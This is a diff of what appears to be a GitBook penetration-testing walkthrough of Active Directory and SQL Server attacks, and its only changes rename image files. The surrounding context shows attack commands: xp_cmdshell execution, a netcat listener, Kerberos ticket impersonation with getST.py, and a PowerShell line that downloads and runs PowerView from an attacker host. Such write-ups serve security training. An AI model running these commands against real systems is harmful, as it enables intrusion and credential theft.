@@ -303,7 +303,7 @@ EXEC master..xp_cmdshell 'whoami'
 * Start a webserver on port 8090: `python3 -m http.server 8090`
 * Start a listener on port 443: `nc -lvp 443`
 
-![](<../../../.gitbook/assets/image (35) (1).png>)
+![](<../../../.gitbook/assets/image (35) (1) (1).png>)
 
 4\. Now we need to change/type the payload we want to execute on the SQL server. A method I learned to use is to base64 encode the command we want to execute and use the `-enc` parameter inside PowerShell. This prevents a lot of issues with single and double quotes.
 
@@ -435,7 +435,7 @@ Once we check our NTLMRelay tool output we see that it succesfully authenticated
 getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
 ```
 
-![](<../../../.gitbook/assets/image (33).png>)
+![](<../../../.gitbook/assets/image (33) (2).png>)
 
 8\. Now we can use the ticket and authenticate with tools that support these, most (if not all) Impacket tools support this. So we can run [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to retrieve the local useraccount hashes.
 
@@ -703,7 +703,7 @@ iex (iwr http://192.168.248.2:8090/PowerView.ps1 -usebasicparsing)
 Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 Data01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
-![](<../../../.gitbook/assets/image (32).png>)
+![](<../../../.gitbook/assets/image (32) (2).png>)
 
 13\. The attribute haven't been set. Before we can write to it, we need to prepare the descriptor. First we need to get the SID of the computerobject `FAKE01` which we created. We can request this with PowerView:
 
@@ -818,7 +818,7 @@ The `pbData` field contains the encrypted data and the `guidMasterKey` contains 
 
 For some reason I kept getting errors, even If I gained a shell as `sa_sql` through crackmapexec. We already owned the machine so maybe we could just RDP into it. But RDP is disabled:
 
-![](<../../../.gitbook/assets/image (35).png>)
+![](<../../../.gitbook/assets/image (35) (1).png>)
 
 We could always just enable RDP with the following commands:
 
